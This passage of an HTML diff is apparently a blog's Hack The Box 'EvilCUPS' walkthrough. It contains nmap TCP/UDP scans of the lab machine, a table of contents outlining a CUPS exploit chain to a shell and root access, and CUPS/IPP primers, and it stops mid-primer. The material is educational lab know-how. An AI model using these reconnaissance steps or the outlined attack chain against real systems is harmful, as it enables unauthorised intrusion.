@@ -1,0 +1,1544 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.136.2">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            EvilCUPS HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            EvilCUPS HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                EvilCUPS HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.22.10"
+                            >2024.22.10
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        10 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/medium/"
+                            class="tag-btn">
+                            Medium
+                        </a>
+                    
+                        <a
+                            href="/tags/linux/"
+                            class="tag-btn">
+                            LINUX
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2024-4176/"
+                            class="tag-btn">
+                            CVE-2024-4176
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2024-4175/"
+                            class="tag-btn">
+                            CVE-2024-4175
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2024-4177/"
+                            class="tag-btn">
+                            CVE-2024-4177
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2024-4076/"
+                            class="tag-btn">
+                            CVE-2024-4076
+                        </a>
+                    
+                        <a
+                            href="/tags/cups/"
+                            class="tag-btn">
+                            CUPS
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/evilcups-box/" class="bread-btn">
+    
+
+    
+        
+            EvilCUPS HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#evilcups-hack-the-box-walkthrough-writeup">EvilCUPS Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#cups-631">CUPS <code>631</code>:</a></li>
+        <li><a href="#attack-chain">Attack Chain:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#exploiting-the-cups-vulnerabilities-to-get-a-low-privilege-shell">Exploiting the CUPS vulnerabilities to get a low privilege shell:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#reading-cached-print-queues-to-retrieve-the-root-password">Reading Cached Print Queues to retrieve the Root Password:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-ownership">4. Ownership:</a>
+      <ul>
+        <li><a href="#ssh-ing-as-root-to-get-the-root-flag">SSH&rsquo;ing As Root to get the root flag:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="evilcups-hack-the-box-walkthrough-writeup">EvilCUPS Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/EvilCUPS">https://app.hackthebox.com/machines/EvilCUPS</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li><strong>Variables</strong>:
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Wordlists</strong>:
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li>
+<p><strong>Basic TCP Scan</strong>:</p>
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%2046.02-HTB/BlogEntriesMade/EvilCups/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2007:16:48%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-22%2007:16%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.231.157%0a%20%20Host%20is%20up%20%280.036s%20latency%29.%0a%20%20Not%20shown:%20998%20closed%20tcp%20ports%20%28reset%29%0a%20%20PORT%20%20%20%20STATE%20SERVICE%0a%20%2022/tcp%20%20open%20%20ssh%0a%20%20631/tcp%20open%20%20ipp%0a%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%207.31%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>  🕙 07:16:48 zsh ❯ nmap $box -Pn -oA basicScan
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-22 07:16 BST
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.231.157
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>  22/tcp  open  ssh
+</span></span><span style="display:flex;"><span>  631/tcp open  ipp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.31 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>I am doing this box purely to understand the recent <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47176">CVE-2024-47176</a> further so know that 631 will be interesting.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Basic UDP Scan</strong>:</p>
+<ul>
+<li><code>sudo nmap $box -sU -Pn -oA UDPbasicScan</code></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%2046.02-HTB/BlogEntriesMade/EvilCups/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2007:17:00%20zsh%20%e2%9d%af%20sudo%20nmap%20$box%20-sU%20-Pn%20-oA%20UDPbasicScan%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-22%2007:21%20BST%0aStats:%200:05:57%20elapsed;%200%20hosts%20completed%20%281%20up%29,%201%20undergoing%20UDP%20Scan%0aUDP%20Scan%20Timing:%20About%2035.08%25%20done;%20ETC:%2007:38%20%280:10:50%20remaining%29%0aStats:%200:16:46%20elapsed;%200%20hosts%20completed%20%281%20up%29,%201%20undergoing%20UDP%20Scan%0aUDP%20Scan%20Timing:%20About%2096.55%25%20done;%20ETC:%2007:38%20%280:00:36%20remaining%29%0aNmap%20scan%20report%20for%2010.129.231.157%0aHost%20is%20up%20%280.035s%20latency%29.%0aNot%20shown:%20997%20closed%20udp%20ports%20%28port-unreach%29%0aPORT%20%20%20%20%20STATE%20%20%20%20%20%20%20%20%20SERVICE%0a68/udp%20%20%20open%7cfiltered%20dhcpc%0a631/udp%20%20open%7cfiltered%20ipp%0a5353/udp%20open%7cfiltered%20zeroconf%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%201050.49%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 07:17:00 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-22 07:21 BST
+</span></span><span style="display:flex;"><span>Stats: 0:05:57 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing UDP Scan
+</span></span><span style="display:flex;"><span>UDP Scan Timing: About 35.08% <span style="color:#66d9ef">done</span>; ETC: 07:38 <span style="color:#f92672">(</span>0:10:50 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:16:46 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing UDP Scan
+</span></span><span style="display:flex;"><span>UDP Scan Timing: About 96.55% <span style="color:#66d9ef">done</span>; ETC: 07:38 <span style="color:#f92672">(</span>0:00:36 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.231.157
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE         SERVICE
+</span></span><span style="display:flex;"><span>68/udp   open|filtered dhcpc
+</span></span><span style="display:flex;"><span>631/udp  open|filtered ipp
+</span></span><span style="display:flex;"><span>5353/udp open|filtered zeroconf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1050.49 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>As expeced IPP and CUPS.</li>
+</ul>
+</li>
+</ul>
+<h3 id="cups-631">CUPS <code>631</code>:</h3>
+<ul>
+<li>
+<p><strong>As we know</strong> <code>CUPS *is running we can visit the web server by visiting* ~http://[ip]:631</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-073523_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try the</strong> <code>administration</code> <strong>button but this is denied</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-22-073752_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="common-unix-printing-system--cups--primer">Common UNIX Printing System (CUPS) Primer:</h4>
+<ul>
+<li>
+<p><strong>What is CUPS?</strong>:</p>
+<ul>
+<li>CUPS (Common UNIX Printing System) is an open-source printing system developed by Apple for macOS, Linux, and other UNIX-like operating systems.</li>
+<li>It allows a computer to act as a print server, enabling clients to send print jobs to printers using Internet Printing Protocol (IPP) and other protocols.</li>
+<li>Supports printing to both local and network printers, handling print queues and printer management.</li>
+</ul>
+</li>
+<li>
+<p><strong>Key Features of CUPS</strong>:</p>
+<ul>
+<li><strong>Print Server Functionality</strong>:
+<ul>
+<li>Manages printers and print jobs on both local machines and networked environments.</li>
+</ul>
+</li>
+<li><strong>Protocol Support</strong>:
+<ul>
+<li>Uses IPP as its core protocol but also supports older protocols such as Line Printer Daemon (LPD), Server Message Block (SMB), and more.</li>
+</ul>
+</li>
+<li><strong>Driver Flexibility</strong>:
+<ul>
+<li>Allows the use of a variety of printer drivers, supporting a wide range of printers.</li>
+</ul>
+</li>
+<li><strong>Web Interface</strong>:
+<ul>
+<li>Provides a web-based interface for configuring printers, managing jobs, and accessing logs.</li>
+</ul>
+</li>
+<li><strong>Authentication and Security</strong>:
+<ul>
+<li>Supports various authentication methods (e.g., Basic, Digest, Kerberos) and encrypts connections using TLS to ensure secure printing.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>How CUPS Works</strong>:</p>
+<ul>
+<li><strong>Queue System</strong>:
+<ul>
+<li>CUPS handles print jobs by placing them in a queue, where they are processed and sent to the printer in the order they are received.</li>
+</ul>
+</li>
+<li><strong>Backend System</strong>:
+<ul>
+<li>CUPS uses backends to communicate with printers. The most common backend is IPP, but others like USB and LPD are also available.</li>
+</ul>
+</li>
+<li><strong>Filters</strong>:
+<ul>
+<li>CUPS uses filters to convert print data from application formats (like PDF or PostScript) into formats the printer can understand.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Security Considerations</strong>:</p>
+<ul>
+<li>CUPS exposes ports (usually <code>631</code> for IPP) which, if misconfigured, could lead to unauthorized access.</li>
+<li>Proper configuration and updates are critical to avoid vulnerabilities, especially in networked environments where CUPS could be exploited remotely.</li>
+</ul>
+</li>
+</ul>
+<h4 id="internet-printing-protocol--ipp--primer">Internet Printing Protocol (IPP) Primer:</h4>
+<ul>
+<li>
+<p><strong>Definition</strong>:</p>
+<ul>
+<li>IPP is a network protocol used for communication between client devices and printers (or print servers). It allows for the submission, management, and control of print jobs over a network.</li>
+<li>It is the core protocol used by CUPS and other modern printing systems for handling print tasks.</li>
+</ul>
+</li>
+<li>
+<p><strong>Key Features of IPP</strong>:</p>
+<ul>
+<li><strong>Printing Control</strong>:
+<ul>
+<li>IPP enables clients to send print jobs to printers, cancel jobs, check the status of printers and jobs, and retrieve printer capabilities.</li>
+</ul>
+</li>
+<li><strong>Standardization</strong>:
+<ul>
+<li>Defined by the Internet Engineering Task Force (IETF), IPP is a well-documented, standardized protocol.</li>
+</ul>
+</li>
+<li><strong>Support for Secure Transmission</strong>:
+<ul>
+<li>IPP can use HTTP over SSL (HTTPS) to ensure secure, encrypted communication between client and server.</li>
+</ul>
+</li>
+<li><strong>Advanced Printer Features</strong>:
+<ul>
+<li>Supports a wide range of printing features, such as duplex printing, media selection, and finishing options.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>How IPP Works</strong>:</p>
+<ul>
+<li><strong>Job Submission</strong>:
+<ul>
+<li>Clients send print requests (in IPP format) to a printer or print server.</li>
+</ul>
+</li>
+<li><strong>Job and Queue Management</strong>:
+<ul>
+<li>The protocol allows clients to monitor and manage print jobs, with the ability to query job status, hold jobs, or cancel them.</li>
+</ul>
+</li>
+<li><strong>Communication</strong>:
+<ul>
+<li>IPP communicates over port 631 by default, using HTTP as the transport layer. This allows it to be integrated into web-based services.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Security Features</strong>:</p>
+<ul>
+<li><strong>Authentication and Encryption</strong>:
+<ul>
+<li>Supports various authentication mechanisms and encryption via TLS, ensuring only authorized users can submit or manage print jobs.</li>
+</ul>
+</li>
+<li><strong>Access Control</strong>:
+<ul>
